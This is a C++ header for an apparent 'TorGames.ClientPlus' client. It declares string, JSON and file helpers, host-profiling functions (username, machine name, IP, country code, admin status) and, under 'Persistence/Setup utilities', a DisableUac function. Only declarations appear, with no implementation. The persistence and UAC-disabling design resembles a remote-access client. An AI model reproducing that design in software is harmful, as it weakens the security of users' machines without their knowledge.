// TorGames.ClientPlus - Utility functions
#pragma once

#include "common.h"

namespace Utils {
    // String utilities
    std::string ToLower(const std::string& str);
    std::string Trim(const std::string& str);
    std::vector<std::string> Split(const std::string& str, char delimiter);

    // JSON utilities (simple implementation)
    std::string JsonEscape(const std::string& str);
    std::string JsonGetString(const char* json, const char* key);
    long long JsonGetInt(const char* json, const char* key);
    bool JsonGetBool(const char* json, const char* key);

    // System utilities
    std::string GetMachineName();
    std::string GetUsername();
    std::string GetOsVersion();
    std::string GetArchitecture();
    int GetCpuCount();
    long long GetTotalMemory();
    long long GetAvailableMemory();
    std::string GetLocalIp();
    std::string GetCountryCode();
    bool IsRunningAsAdmin();
    bool IsUacEnabled();

    // SHA256
    std::string Sha256(const std::string& input);

    // File utilities
    bool FileExists(const char* path);
    bool DirectoryExists(const char* path);
    bool CreateDirectoryRecursive(const char* path);

    // Persistence/Setup utilities
    bool DisableUac();
    bool IsUacDisabled();

    // Session utilities
    bool IsUserLoggedIn();
}
